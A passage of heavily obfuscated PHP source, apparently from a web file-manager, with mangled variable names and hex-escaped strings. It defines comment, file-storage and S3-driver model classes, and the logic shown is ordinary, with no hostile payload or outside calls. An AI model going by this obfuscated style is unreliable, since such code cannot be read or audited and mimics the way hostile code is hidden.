array_to_keyvalue($ëö£›äº, $é™ôç‰…[12], $é™ôç‰…[1671]); $Æ“ìÍĞƒ[$é™ôç‰…[1897]] = Model($é™ôç‰…[542])->userListInfo($ëö£›äº); return $Æ“ìÍĞƒ; } public function remove($€ĞË°óì) { $ì–¨¹í’ =& $_SERVER[”ú…±Ú¥]; $œªÂ‡¢ = array($ì–¨¹í’[1891] => $€ĞË°óì); $ œå¯©Ÿ = $this->where($œªÂ‡¢)->find(); if ($ œå¯©Ÿ[$ì–¨¹í’[1890]]) { $this->where(array($ì–¨¹í’[1891] => $ œå¯©Ÿ[$ì–¨¹í’[1890]]))->setAdd($ì–¨¹í’[1892], -1); } return $this->where($œªÂ‡¢)->delete(); } public function edit($Èù»ì†É, $Ì°¢Ş²Æ) { $¸óí€”² =& $_SERVER[”ú…±Ú¥]; $Áğüß× = array($¸óí€”²[1891] => $Èù»ì†É); return $this->where($Áğüß×)->save(array($¸óí€”²[1900] => $Ì°¢Ş²Æ)); } public function prasise($¿Š‰Á€÷) { $è¡‚ü›ï =& $_SERVER[”ú…±Ú¥]; $ËßĞª = Model($è¡‚ü›ï[1901]); $õŠ€åù÷ = array($è¡‚ü›ï[1891] => $¿Š‰Á€÷, $è¡‚ü›ï[1662] => USER_ID); $úŞàÎ¢‘ = $ËßĞª->where($õŠ€åù÷)->find(); if (!$úŞàÎ¢‘) { $ËßĞª->add($õŠ€åù÷); $ü Àåùª = $this->where(array($è¡‚ü›ï[1891] => $¿Š‰Á€÷))->setAdd($è¡‚ü›ï[1893], 1); } else { $ËßĞª->where($õŠ€åù÷)->delete(); $ü Àåùª = $this->where(array($è¡‚ü›ï[1891] => $¿Š‰Á€÷))->setAdd($è¡‚ü›ï[1893], -1); } return $ü Àåùª; } public function targetInfo($¯²•²È, $‚ÍµÕÔØ) { $÷Û™¸æ¿ =& $_SERVER[”ú…±Ú¥]; $Âªş—ğ = array($÷Û™¸æ¿[614] => $¯²•²È, $÷Û™¸æ¿[615] => $‚ÍµÕÔØ); $¬ş÷áã = $this->where($Âªş—ğ)->count(); $ÏÉ³ùÆ = "\122\111\107\x48\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x63\157\x6d\155\145\156\164\x5f\160\x72\141\151\x73\x65\x20\163\x74\x61\x72\x20\x6f\156\x20\x63\x6f\x6d\x6d\x65\x6e\x74\x2e\x63\x6f\x6d\x6d\x65\x6e\x74\x49\104\40\x3d\40\x73\x74\x61\x72\x2e\143\157\x6d\x6d\x65\156\164\111\x44"; $—ù¼™üó = $this->alias($÷Û™¸æ¿[392])->where($Âªş—ğ)->join($ÏÉ³ùÆ, $÷Û™¸æ¿[1902])->count(); $›ì–ºÙç = array($÷Û™¸æ¿[1903] => $¬ş÷áã, $÷Û™¸æ¿[1904] => $—ù¼™üó); return $›ì–ºÙç; } public function listData($‡¨Ï±“Ê) { $ñ§£èÕô =& $_SERVER[”ú…±Ú¥]; if (isset($‡¨Ï±“Ê[$ñ§£èÕô[1905]])) { if ($‡¨Ï±“Ê[$ñ§£èÕô[1905]]) { $‡¨Ï±“Ê[$ñ§£èÕô[1898]] = array($ñ§£èÕô[1043], intval($‡¨Ï±“Ê[$ñ§£èÕô[1905]])); } unset($‡¨Ï±“Ê[$ñ§£èÕô[1905]]); } if (isset($‡¨Ï±“Ê[$ñ§£èÕô[1906]])) { if ($‡¨Ï±“Ê[$ñ§£èÕô[1906]]) { $‡¨Ï±“Ê[$ñ§£èÕô[1898]] = array($ñ§£èÕô[1040], intval($‡¨Ï±“Ê[$ñ§£èÕô[1906]])); } unset($‡¨Ï±“Ê[$ñ§£èÕô[1906]]); } return $this->_listData($‡¨Ï±“Ê); } private function _listData($„ï¼İ) { $ÙŒéòæè =& $_SERVER[”ú…±Ú¥]; $½ÛêÒõ¾ = $this->where($„ï¼İ)->_makeOrder()->selectPage(100); $this->_listAppendParent($½ÛêÒõ¾[$ÙŒéòæè[407]]); $this->_listAppendUser($½ÛêÒõ¾[$ÙŒéòæè[407]]); $this->_listAppendMeta($½ÛêÒõ¾[$ÙŒéòæè[407]]); return $½ÛêÒõ¾; } private function _makeOrder() { $ŒÌ²Ñ»ò =& $_SERVER[”ú…±Ú¥]; $Öºë˜øğ = array($ŒÌ²Ñ»ò[1893], $ŒÌ²Ñ»ò[1892], $ŒÌ²Ñ»ò[211]); $Öç£ë = Input::get($ŒÌ²Ñ»ò[495], $ŒÌ²Ñ»ò[7], $ŒÌ²Ñ»ò[461], $Öºë˜øğ); $‰»â°ıä = Input::get($ŒÌ²Ñ»ò[496], $ŒÌ²Ñ»ò[7], $ŒÌ²Ñ»ò[1664], array($ŒÌ²Ñ»ò[1907], $ŒÌ²Ñ»ò[491])); $ÉŠëßÕâ = $Öç£ë . $ŒÌ²Ñ»ò[53] . $‰»â°ıä; return $this->order($ÉŠëßÕâ); } private function _listAppendParent(&$Æ÷ßşÙŠ) { $ÙñÂ»á =& $_SERVER[”ú…±Ú¥]; $òåÓˆ¯ = array_unique(array_to_keyvalue($Æ÷ßşÙŠ, $ÙñÂ»á[12], $ÙñÂ»á[1890])); $òåÓˆ¯ = array_remove_value($òåÓˆ¯, $ÙñÂ»á[208]); if (!$òåÓˆ¯) { return; } $–Â¥›æƒ = $this->where(array($ÙñÂ»á[1891] => array($ÙñÂ»á[7], $òåÓˆ¯)))->select(); $–Â¥›æƒ = array_to_keyvalue($–Â¥›æƒ, $ÙñÂ»á[1898]); foreach ($Æ÷ßşÙŠ as &$±¾È­) { if (isset($–Â¥›æƒ[$±¾È­[$ÙñÂ»á[1890]]])) { $±¾È­[$ÙñÂ»á[1908]] = $–Â¥›æƒ[$±¾È­[$ÙñÂ»á[1890]]]; } } unset($±¾È­); } private function _listAppendUser(&$Ëªó×®˜) { $ûİ²‘ =& $_SERVER[”ú…±Ú¥]; $àŒ³•±è = array_unique(array_to_keyvalue($Ëªó×®˜, $ûİ²‘[12], $ûİ²‘[1671])); $àŒ³•±è = array_remove_value($àŒ³•±è, $ûİ²‘[208]); if (count($àŒ³•±è) == 0) { return; } foreach ($Ëªó×®˜ as $Ò¢”ßà¬) { if (isset($Ò¢”ßà¬[$ûİ²‘[1908]])) { $àŒ³•±è[] = $Ò¢”ßà¬[$ûİ²‘[1908]][$ûİ²‘[1671]]; } } $¨†ç”Íê = Model($ûİ²‘[563])->userListInfo($àŒ³•±è); foreach ($Ëªó×®˜ as &$Ò¢”ßà¬) { $Ò¢”ßà¬[$ûİ²‘[628]] = $¨†ç”Íê[$Ò¢”ßà¬[$ûİ²‘[1671]]]; if (isset($Ò¢”ßà¬[$ûİ²‘[1908]])) { $Ò¢”ßà¬[$ûİ²‘[1908]][$ûİ²‘[628]] = $¨†ç”Íê[$Ò¢”ßà¬[$ûİ²‘[1908]][$ûİ²‘[1671]]]; } } unset($Ò¢”ßà¬); } private function _listAppendMeta(&$„ÃŠôÒ‘) { $‘£ĞÅìĞ =& $_SERVER[”ú…±Ú¥]; $—Šİ…¥ = array_unique(array_to_keyvalue($„ÃŠôÒ‘, $‘£ĞÅìĞ[12], $‘£ĞÅìĞ[1898])); $—Šİ…¥ = array_remove_value($—Šİ…¥, $‘£ĞÅìĞ[208]); if (!$—Šİ…¥) { return; } foreach ($„ÃŠôÒ‘ as $¯ãÖ²ãã) { if (isset($¯ãÖ²ãã[$‘£ĞÅìĞ[1908]])) { $—Šİ…¥[] = $¯ãÖ²ãã[$‘£ĞÅìĞ[1908]][$‘£ĞÅìĞ[1898]]; } } $½¸äßéì = $this->metaList($—Šİ…¥); if (!$½¸äßéì) { return !1; } foreach ($„ÃŠôÒ‘ as &$¯ãÖ²ãã) { $¯ãÖ²ãã[$‘£ĞÅìĞ[504]] = $½¸äßéì[$¯ãÖ²ãã[$‘£ĞÅìĞ[1898]]]; if (isset($¯ãÖ²ãã[$‘£ĞÅìĞ[1908]])) { $¯ãÖ²ãã[$‘£ĞÅìĞ[1908]][$‘£ĞÅìĞ[504]] = $½¸äßéì[$¯ãÖ²ãã[$‘£ĞÅìĞ[1908]][$‘£ĞÅìĞ[1898]]]; } } unset($¯ãÖ²ãã); } private function metaList($¥ÙôÊ¾Ú) { $²áóãíä =& $_SERVER[”ú…±Ú¥]; if (!$¥ÙôÊ¾Ú) { return array(); } $öøºÏÆ× = array($²áóãíä[1898] => array($²áóãíä[7], $¥ÙôÊ¾Ú)); $€¼¹ëô¦ = Model($²áóãíä[1909])->where($öøºÏÆ×)->select(); $€¼¹ëô¦ = array_to_keyvalue_group($€¼¹ëô¦, $²áóãíä[1898]); foreach ($€¼¹ëô¦ as $çËŸº—Ë => $ŸŞ™“ÀŠ) { $ î„’äÑ = array(); foreach ($ŸŞ™“ÀŠ as $Õî¶¸Œß) { $ î„’äÑ[$Õî¶¸Œß[$²áóãíä[94]]] = $Õî¶¸Œß[$²áóãíä[412]]; } $€¼¹ëô¦[$çËŸº—Ë] = $ î„’äÑ; } return $€¼¹ëô¦ ? $€¼¹ëô¦ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\154\145\137\143\157\x6e\x74\x65\156\164\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\155\x65", "\164\151\x6d\145", "\151\x6e\163\145\x72\164", "\146\165\156\143\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\142\154\145\116\x61\x6d\145" => "\x69\157\137\146\x69\154\145\137\155\x65\164\x61", "\x6d\x65\164\141\x46\x69\x65\154\144" => "\146\x69\x6c\145\111\104"); public function fileInfo($ø¡ñì±æ) { $½ÜèË¾£ =& $_SERVER[”ú…±Ú¥]; static $÷ú¼¨ßÉ = array(); if (!isset($÷ú¼¨ßÉ[$ø¡ñì±æ])) { $Êï“ã” = $½ÜèË¾£[1910]; $ñÌâä¤· = Model($½ÜèË¾£[509])->field($Êï“ã”)->where(array($½ÜèË¾£[507] => $ø¡ñì±æ))->find(); $÷ú¼¨ßÉ[$ø¡ñì±æ] = $ñÌâä¤·; } return $÷ú¼¨ßÉ[$ø¡ñì±æ]; } public function addFileByContent($’é¼›Ü = '', $†ŞİªÏì = '') { $È¿„‹ë² =& $_SERVER[”ú…±Ú¥]; $Á¦íñíâ = TEMP_PATH . $È¿„‹ë²[1911]; if (!is_dir($Á¦íñíâ)) { mk_dir($Á¦íñíâ); } $„ÅŸœ« = $Á¦íñíâ . $È¿„‹ë²[1912] . rand_string(16); file_put_contents($„ÅŸœ«, $’é¼›Ü); $Çõ‘şÜß = $this->addFile($„ÅŸœ«, $†ŞİªÏì, !0); if (file_exists($„ÅŸœ«)) { @unlink($„ÅŸœ«); } return $Çõ‘şÜß; } public function createFileName($ò™³¬±â, $öõùôô½ = false, $«ñ©«Ã = false) { $¾º¤ˆÎ =& $_SERVER[”ú…±Ú¥]; $È“¨¼Ëñ = IO::init($¾º¤ˆÎ[8]); $¥Àş¸í = $this->makeFilePath($ò™³¬±â, $È“¨¼Ëñ, $öõùôô½, $«ñ©«Ã); $·ÌÚ¥à« = $È“¨¼Ëñ->pathFather($¥Àş¸í); static $ŠàŞ×Öú = false; $€šóêÓü = $¾º¤ˆÎ[1913] . md5($·ÌÚ¥à«); if (!$ŠàŞ×Öú && !Cache::get($€šóêÓü)) { $ŠàŞ×Öú = !0; $¾–¨¯ê = IO::mkdir($·ÌÚ¥à«); if (!IO::exist($¾–¨¯ê . $¾º¤ˆÎ[829])) { IO::mkfile($¾–¨¯ê . $¾º¤ˆÎ[829]); } Cache::set($€šóêÓü, 1, 3600 * 2); } return $¥Àş¸í; } public function makeFilePath($Õ‚ —âÆ, $åÙ‘¿€, $è¿·¦ËÅ = false, $É¹çã = false) { $¥Í×µúæ =& $_SERVER[”ú…±Ú¥]; $±å‚ò˜™ = Model($¥Í×µúæ[802])->get($¥Í×µúæ[1914]); $©ÒÍ€Åç = KodIO::defaultIO() . date($¥Í×µúæ[1915]); $å¡—Ôı = $©ÒÍ€Åç . rand_string(5) . short_id(100); $Õ‚ —âÆ = str_replace($¥Í×µúæ[8], $¥Í×µúæ[11], KodIO::clear($Õ‚ —âÆ)); $‘¯×øÓ¨ = $åÙ‘¿€->ext($Õ‚ —âÆ); if (!$Õ‚ —âÆ) { $±å‚ò˜™ = $¥Í×µúæ[1916]; } switch ($±å‚ò˜™) { case $¥Í×µúæ[1917]: $å¡—Ôı = $å¡—Ôı . $¥Í×µúæ[10] . $åÙ‘¿€->ext($Õ‚ —âÆ); if ($‘¯×øÓ¨ == $¥Í×µúæ[1854]) { $å¡—Ôı .= $¥Í×µúæ[1235]; } break; case $¥Í×µúæ[1918]: $˜—£Ãˆ® = Model($¥Í×µúæ[802])->get($¥Í×µúæ[803]); $ªîŠ‹Øï = substr(md5($¥Í×µúæ[804] . $˜—£Ãˆ® . date($¥Í×µúæ[780])), 0, 8); $‡§°É÷û = KodIO::defaultDriver(); $©ÒÍ€Åç = $¥Í×µúæ[1266] . $‡§°É÷û[$¥Í×µúæ[437]] . $¥Í×µúæ[447] . date($¥Í×µúæ[1919]) . $ªîŠ‹Øï . $¥Í×µúæ[8]; if ($‘¯×øÓ¨ == $¥Í×µúæ[1854]) { $Õ‚ —âÆ .= $¥Í×µúæ[1235]; } $éËúó³— = $¥Í×µúæ[1920] . $©ÒÍ€Åç . $Õ‚ —âÆ; CacheLock::lock($éËúó³—); $å¡—Ôı = $©ÒÍ€Åç . $Õ‚ —âÆ; if (IO::exist($©ÒÍ€Åç . $Õ‚ —âÆ)) { $ë£Ó‰šï = substr($Õ‚ —âÆ, 0, strlen($Õ‚ —âÆ) - strlen($‘¯×øÓ¨)); $³Í„¡ÑÊ = $É¹çã ? substr($É¹çã, 0, 5) : ($è¿·¦ËÅ ? substr($è¿·¦ËÅ, 0, 5) : rand_string(5)); $å¡—Ôı = $©ÒÍ€Åç . $ë£Ó‰šï . $³Í„¡ÑÊ . $¥Í×µúæ[10] . $‘¯×øÓ¨; } if (IO::isTypeObject($å¡—Ôı) && !IO::isUploadServer($å¡—Ôı)) { if (IO::exist($å¡—Ôı)) { return $å¡—Ôı; } $‘Üš¬£Í = IO::setContent($å¡—Ôı, $¥Í×µúæ[12]); if (!$‘Üš¬£Í) { show_json($¥Í×µúæ[1921], !1); } } CacheLock::unlock($éËúó³—); break; case $¥Í×µúæ[1916]: break; default: break; } return $å¡—Ôı; } public function addFileByRemote($œ·åş—, $ôÀÛ°õœ, $ìÀó–©œ = array()) { $€Ê­ß‡ñ =& $_SERVER[”ú…±Ú¥]; if (!IO::exist($œ·åş—)) { return !1; } $®·õ‰£º = $ìÀó–©œ[$€Ê­ß‡ñ[176]] ? $ìÀó–©œ[$€Ê­ß‡ñ[176]] : $€Ê­ß‡ñ[12]; $ş½¥°Ô² = IO::hashMd5($œ·åş—, $®·õ‰£º); $£å¼ßÎ = KodIO::defaultDriver(); $Š¾˜¹®ä = array($€Ê­ß‡ñ[583] => IO::size($œ·åş—), $€Ê­ß‡ñ[1922] => 1, $€Ê­ß‡ñ[458] => $ôÀÛ°õœ, $€Ê­ß‡ñ[840] => $£å¼ßÎ[$€Ê­ß‡ñ[437]], $€Ê­ß‡ñ[459] => $œ·åş—, $€Ê­ß‡ñ[1923] => $ìÀó–©œ[$€Ê­ß‡ñ[177]] ? $ìÀó–©œ[$€Ê­ß‡ñ[177]] : IO::hashSimple($œ·åş—), $€Ê­ß‡ñ[1924] => $ş½¥°Ô² ? $ş½¥°Ô² : $®·õ‰£º); if ($™ ±Üšä = $this->addFileCheckExist($Š¾˜¹®ä[$€Ê­ß‡ñ[177]], $Š¾˜¹®ä[$€Ê­ß‡ñ[176]], $Š¾˜¹®ä[$€Ê­ß‡ñ[76]])) { return $™ ±Üšä; } return $this->addFileData($Š¾˜¹®ä); } private function addFileData($šÃã¦¡¥) { $ÜÊûÉšÈ =& $_SERVER[”ú…±Ú¥]; if (!$šÃã¦¡¥) { return !1; } $šÃã¦¡¥[$ÜÊûÉšÈ[76]] = intval($šÃã¦¡¥[$ÜÊûÉšÈ[76]]); if (!$šÃã¦¡¥[$ÜÊûÉšÈ[76]] && strlen($šÃã¦¡¥[$ÜÊûÉšÈ[177]]) > 32) { $šÃã¦¡¥[$ÜÊûÉšÈ[76]] = intval(substr($šÃã¦¡¥[$ÜÊûÉšÈ[177]], 32)); } $Ù…ÍÚ ô = $this->add($šÃã¦¡¥); return $this->find($Ù…ÍÚ ô); } public function addFile($“Ş—”’¤, $ŠÂÔ³ò, $èĞİ®Ô‚ = false) { $ÊÉñÖåæ =& $_SERVER[”ú…±Ú¥]; $´±òí× = IO::hashSimple($“Ş—”’¤); $ÚÍÊÒª¥ = IO::size($“Ş—”’¤); $¿ÚíğĞ = $ÚÍÊÒª¥ <= 1024 * 1024 * 10 ? IO::hashMd5($“Ş—”’¤) : $ÊÉñÖåæ[12]; $Ã™•›«ø = $ÊÉñÖåæ[1925] . $´±òí×; CacheLock::lock($Ã™•›«ø); if ($¿ÚíğĞ && $´±òí×) { $ÇÖßó“Ù = $this->addFileCheckExist($´±òí×, $¿ÚíğĞ, $ÚÍÊÒª¥); if ($ÇÖßó“Ù) { CacheLock::unlock($Ã™•›«ø); return $ÇÖßó“Ù; } } $š¿¨Ô” = $this->addFileMake($“Ş—”’¤, $ÚÍÊÒª¥, $´±òí×, $¿ÚíğĞ, $ŠÂÔ³ò, $èĞİ®Ô‚); $åØá—îµ = $this->addFileData($š¿¨Ô”); CacheLock::unlock($Ã™•›«ø); if (!$¿ÚíğĞ && $åØá—îµ) { $this->fileMd5Check($åØá—îµ); } return $åØá—îµ; } private function fileMd5Check($Ğ¸³Ò°á) { $ôïøÃÍß =& $_SERVER[”ú…±Ú¥]; $²çäÖ²´ = array($Ğ¸³Ò°á[$ôïøÃÍß[506]], $Ğ¸³Ò°á[$ôïøÃÍß[84]]); $”ƒõã·­ = $ôïøÃÍß[1926] . $Ğ¸³Ò°á[$ôïøÃÍß[84]]; $Ûøäº‚ = $ôïøÃÍß[1927] . $Ğ¸³Ò°á[$ôïøÃÍß[506]]; $³ÃÁÏÙ“ = TaskQueue::add($ôïøÃÍß[1928], $²çäÖ²´, $”ƒõã·­, $Ûøäº‚); if (!$³ÃÁÏÙ“) { $this->fileMd5Set($Ğ¸³Ò°á[$ôïøÃÍß[506]], $Ğ¸³Ò°á[$ôïøÃÍß[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($à¨¡®œ, $™ü­ÄË÷) { $³Á¿Œì =& $_SERVER[”ú…±Ú¥]; $©§¬â• = $this->find($à¨¡®œ); if (!$©§¬â• || $©§¬â•[$³Á¿Œì[176]]) { return; } $ØƒªÈÁ¥ = IO::hashMd5($™ü­ÄË÷); if (!$ØƒªÈÁ¥) { return $³Á¿Œì[12]; } $this->where(array($³Á¿Œì[506] => $à¨¡®œ))->save(array($³Á¿Œì[176] => $ØƒªÈÁ¥)); } public function addFileMake($’úà’€è, $ù½Şø¯Ü, $‚Á¿£û®, $ñúüñ, $›¦Ë¨Ü, $¢ÛÎ´À) { $´¦›•Ó =& $_SERVER[”ú…±Ú¥]; $Ü©ÕàŠ = $this->createFileName($›¦Ë¨Ü, $‚Á¿£û®, $ñúüñ); $£Öú„ŸĞ = get_path_father($Ü©ÕàŠ); $å‹šíĞ = get_path_this($Ü©ÕàŠ); if ($¢ÛÎ´À) { $ßæ©İ¾ = IO::move($’úà’€è, $£Öú„ŸĞ, !1, $å‹šíĞ); } else { $ßæ©İ¾ = IO::copy($’úà’€è, $£Öú„ŸĞ, !1, $å‹šíĞ); } if (!$ßæ©İ¾) { return !1; } $Ö¹º±¹ = KodIO::defaultDriver(); $«”òË’Ø = array($´¦›•Ó[583] => $ù½Şø¯Ü, $´¦›•Ó[1922] => 1, $´¦›•Ó[458] => $›¦Ë¨Ü, $´¦›•Ó[840] => $Ö¹º±¹[$´¦›•Ó[437]], $´¦›•Ó[459] => $Ü©ÕàŠ, $´¦›•Ó[1923] => $‚Á¿£û®, $´¦›•Ó[1924] => $ñúüñ); return $«”òË’Ø; } public function addFileCheckExist($ŒÅúŒÛè, $æŸ¥†…, $Èø¤¿‡…) { $—îÖ‹“† =& $_SERVER[”ú…±Ú¥]; $é‡¬™©İ = $this->findByHash($ŒÅúŒÛè, $æŸ¥†…); if (!$é‡¬™©İ) { return !1; } $Áø¸½×Á = array($—îÖ‹“†[1922] => intval($é‡¬™©İ[$—îÖ‹“†[1929]]) + 1, $—îÖ‹“†[583] => $Èø¤¿‡…); $this->where(array($—îÖ‹“†[507] => $é‡¬™©İ[$—îÖ‹“†[506]]))->save($Áø¸½×Á); return $é‡¬™©İ; } public function remove($›ÁºÖßé) { $this->linkCountChange($›ÁºÖßé, !1); $this->clearEmpty(); return !0; } public function linkAdd($İÊ¸îÜ) { $this->linkCountChange($İÊ¸îÜ, !0); } public function linkCountChange($Ÿ¹Çı›î, $ÆÑ§’å) { $õ¶é“› =& $_SERVER[”ú…±Ú¥]; if (!$Ÿ¹Çı›î) { return; } if (!is_array($Ÿ¹Çı›î)) { $Ÿ¹Çı›î = array($Ÿ¹Çı›î); } $ÃÙÔ°Ö = array(); foreach ($Ÿ¹Çı›î as $˜ãŞ¹šĞ) { $Àš¶¯ = $˜ãŞ¹šĞ . $õ¶é“›[12]; if (!$ÃÙÔ°Ö[$Àš¶¯]) { $ÃÙÔ°Ö[$Àš¶¯] = 0; } $ÃÙÔ°Ö[$Àš¶¯]++; } $°Èà«ŞÖ = array(); foreach ($ÃÙÔ°Ö as $˜ãŞ¹šĞ => $€©‘¨º¦) { $Àš¶¯ = $€©‘¨º¦ . $õ¶é“›[12]; if (!$°Èà«ŞÖ[$Àš¶¯]) { $°Èà«ŞÖ[$Àš¶¯] = array(); } $°Èà«ŞÖ[$Àš¶¯][] = $˜ãŞ¹šĞ; } foreach ($°Èà«ŞÖ as $€©‘¨º¦ => $Ÿö„Â‰Á) { if (!$Ÿö„Â‰Á) { continue; } $€©‘¨º¦ = $ÆÑ§’å ? $€©‘¨º¦ : -intval($€©‘¨º¦); $èæ¼µ›€ = array($õ¶é“›[506] => array($õ¶é“›[7], $Ÿö„Â‰Á)); if ($€©‘¨º¦ < 0) { $èæ¼µ›€[$õ¶é“›[1929]] = array($õ¶é“›[1044], abs($€©‘¨º¦)); } $this->where($èæ¼µ›€)->setAdd($õ¶é“›[1929], $€©‘¨º¦); } } public function findByHash($¼ğò’¡, $»ñ¡êÀ = false) { $ˆºÚœ½– =& $_SERVER[”ú…±Ú¥]; if (!$¼ğò’¡ && !$»ñ¡êÀ) { return !1; } $óê¹«¹× = array($ˆºÚœ½–[1923] => $¼ğò’¡); if ($»ñ¡êÀ) { $óê¹«¹× = array($ˆºÚœ½–[1924] => $»ñ¡êÀ); } return $this->order($ˆºÚœ½–[1930])->where($óê¹«¹×)->find(); } public function clearEmpty($š°ªÄÈ³ = 0) { $õ¹Ë®ø¸ =& $_SERVER[”ú…±Ú¥]; $Ìí›Î®ï = time() - 3600 * 24 * $š°ªÄÈ³; $íºì¬úš = $õ¹Ë®ø¸[1931] . $Ìí›Î®ï; $£ë‚Í¡ = $this->where($íºì¬úš)->select(); if (!$£ë‚Í¡) { return; } $‡¦Ë§ = new Task($õ¹Ë®ø¸[1932], $õ¹Ë®ø¸[12], count($£ë‚Í¡)); foreach ($£ë‚Í¡ as $Æ×„óĞ) { $‡¦Ë§->update(1); $this->resetFile($Æ×„óĞ); } $‡¦Ë§->end(); } public function resetFile($£õÉˆ»«) { $Úµéı­ =& $_SERVER[”ú…±Ú¥]; $ùÅÙÂ = array($Úµéı­[507] => $£õÉˆ»«[$Úµéı­[506]]); $¹œ˜êÍ = Model($Úµéı­[1362])->where($ùÅÙÂ)->count(); $ÏÂí‰ïì = Model($Úµéı­[1933])->where($ùÅÙÂ)->count(); $¶°¶ã = intval($¹œ˜êÍ) + intval($ÏÂí‰ïì); if ($¶°¶ã == 0) { IO::remove($£õÉˆ»«[$Úµéı­[84]]); Model($Úµéı­[1934])->delete($£õÉˆ»«[$Úµéı­[506]]); $this->where($ùÅÙÂ)->delete(); $this->metaSet($£õÉˆ»«[$Úµéı­[506]], null, null); return; } if ($£õÉˆ»«[$Úµéı­[1929]] != $¶°¶ã) { $this->where($ùÅÙÂ)->save(array($Úµéı­[1922] => $¶°¶ã)); } } public function storageInfo($ÏïÔË‹÷ = false) { $ÖË«öº =& $_SERVER[”ú…±Ú¥]; $·¬©·èù = $this->count() + 0.0; $¿şãé€Ê = 0; $Ê¬Ù‹œ· = 1; $‹šï Æ = 0; $àÛòŒ—Ò = 5000; for ($Î¦¢Çîş = 0; $Î¦¢Çîş < $·¬©·èù; $Î¦¢Çîş = $Î¦¢Çîş + $àÛòŒ—Ò) { $¹âÑ¨ƒ = $this->limit($Î¦¢Çîş, $Î¦¢Çîş + $àÛòŒ—Ò)->select(); foreach ($¹âÑ¨ƒ as $Ë¢òéá¹) { $Ê¬Ù‹œ· += $Ë¢òéá¹[$ÖË«öº[76]] * $Ë¢òéá¹[$ÖË«öº[1929]]; $¿şãé€Ê += $Ë¢òéá¹[$ÖË«öº[76]] * ($Ë¢òéá¹[$ÖË«öº[1929]] - 1); $‹šï Æ += $Ë¢òéá¹[$ÖË«öº[1929]]; } } $‡Ğ£ÇåÇ = array($ÖË«öº[1935] => $Ê¬Ù‹œ·, $ÖË«öº[1936] => $¿şãé€Ê, $ÖË«öº[1937] => $¿şãé€Ê / $Ê¬Ù‹œ·, $ÖË«öº[80] => $·¬©·èù, $ÖË«öº[1938] => $‹šï Æ); return $‡Ğ£ÇåÇ; } } goto eëö¡“ò; díäìù“Å: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($á‰“ª¶Ã) { $this->pathParse = $á‰“ª¶Ã; } protected function infoParse($Èëº÷ÒÕ, $¤Õ‘í›ˆ = false) { $²Ô¯Î˜ =& $_SERVER[”ú…±Ú¥]; return Action($²Ô¯Î˜[1203])->sharePathInfo($this->pathParse[$²Ô¯Î˜[84]], !0, $¤Õ‘í›ˆ); } public function listPath($„¶ó¶ïß, $¿¡‡’¯  = false) { $şÍ½±Ï =& $_SERVER[”ú…±Ú¥]; $™æóÏòÓ = IO::listPath($„¶ó¶ïß, $¿¡‡’¯ ); if (!$™æóÏòÓ) { return $™æóÏòÓ; } if (is_array($™æóÏòÓ[$şÍ½±Ï[1371]])) { $‹€Ä‹ÍÃ = Action($şÍ½±Ï[1380])->parsePathChildren($™æóÏòÓ[$şÍ½±Ï[1371]], array($şÍ½±Ï[459] => $„¶ó¶ïß)); $™æóÏòÓ[$şÍ½±Ï[1371]] = Action($şÍ½±Ï[1203])->shareItemInfo($‹€Ä‹ÍÃ); } foreach ($™æóÏòÓ as $¨Õº™üˆ => $èõÈ»±¢) { if (!in_array($¨Õº™üˆ, array($şÍ½±Ï[83], $şÍ½±Ï[82]))) { continue; } foreach ($èõÈ»±¢ as $òìàÊ¹À => $‹€Ä‹ÍÃ) { $‹€Ä‹ÍÃ = Action($şÍ½±Ï[1380])->parsePathChildren($‹€Ä‹ÍÃ, array($şÍ½±Ï[459] => $„¶ó¶ïß)); $™æóÏòÓ[$¨Õº™üˆ][$òìàÊ¹À] = Action($şÍ½±Ï[1203])->shareItemInfo($‹€Ä‹ÍÃ); } } return $™æóÏòÓ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($‹¿Ğù“¤) { parent::__construct($‹¿Ğù“¤); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ß¼¢œçâ) { parent::__construct($ß¼¢œçâ); $this->signatureVersion($_SERVER[”ú…±Ú¥][226]); } public function uploadFormData($§Íè˜¯, $„ş†ÉÁƒ = 3600) { $‹íç¶ˆº =& $_SERVER[”ú…±Ú¥]; $–­ûèİÙ = $‹íç¶ˆº[209]; $âŞÖŸÛ = $‹íç¶ˆº[247]; $°ò†°çö = $‹íç¶ˆº[62]; $…íš×ô­ = gmdate($‹íç¶ˆº[248]); $¶²ÙúáË = gmdate($‹íç¶ˆº[249]); $Ù›«¿âŸ = $‹íç¶ˆº[250]; $ì¾ı„¼ = $„ş†ÉÁƒ . $‹íç¶ˆº[12]; $Ó¤õ­¾ = $‹íç¶ˆº[251]; $³Åç‘Ğù = array($this->accessKey, $¶²ÙúáË, $this->region, $°ò†°çö, $Ù›«¿âŸ); $§œìô = implode($‹íç¶ˆº[8], $³Åç‘Ğù); $Ÿœ¥Àµï = array($‹íç¶ˆº[252] => gmdate($‹íç¶ˆº[1354], strtotime($‹íç¶ˆº[254])), $‹íç¶ˆº[255] => array(array($‹íç¶ˆº[256] => $this->bucket), array($‹íç¶ˆº[257] => $–­ûèİÙ), array($‹íç¶ˆº[258], $‹íç¶ˆº[259], $‹íç¶ˆº[12]), array($‹íç¶ˆº[258], $‹íç¶ˆº[260], $‹íç¶ˆº[12]), array($‹íç¶ˆº[258], $‹íç¶ˆº[261], $‹íç¶ˆº[12]), array($‹íç¶ˆº[262] => $Ó¤õ­¾), array($‹íç¶ˆº[263] => $§œìô), array($‹íç¶ˆº[264] => $âŞÖŸÛ), array($‹íç¶ˆº[265] => $…íš×ô­), array($‹íç¶ˆº[266] => $ì¾ı„¼))); $Ÿ¦ƒÔì¤ = base64_encode(json_encode($Ÿœ¥Àµï)); $íõÌ­ë™ = hash_hmac($‹íç¶ˆº[267], $¶²ÙúáË, $‹íç¶ˆº[268] . $this->secret, !0); $©¯Êæ§ï = hash_hmac($‹íç¶ˆº[267], $this->region, $íõÌ­ë™, !0); $«¬üç¨£ = hash_hmac($‹íç¶ˆº[267], $°ò†°çö, $©¯Êæ§ï, !0); $Ø»—¼»Ÿ = hash_hmac($‹íç¶ˆº[267], $Ù›«¿âŸ, 